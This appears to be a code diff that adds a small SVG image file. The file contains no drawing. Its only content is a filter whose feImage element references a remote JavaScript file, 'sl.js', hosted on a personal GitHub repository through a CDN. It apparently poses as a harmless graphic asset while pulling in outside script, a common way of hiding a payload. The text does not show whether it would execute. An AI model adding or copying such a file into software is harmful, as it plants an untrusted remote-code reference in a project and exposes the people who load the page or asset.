@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <filter id="x">
+    <feImage xlink:href="https://cdn.jsdelivr.net/gh/ShahidKalwani/a@refs/heads/main/sl.js"/>
+  </filter>
+</svg>
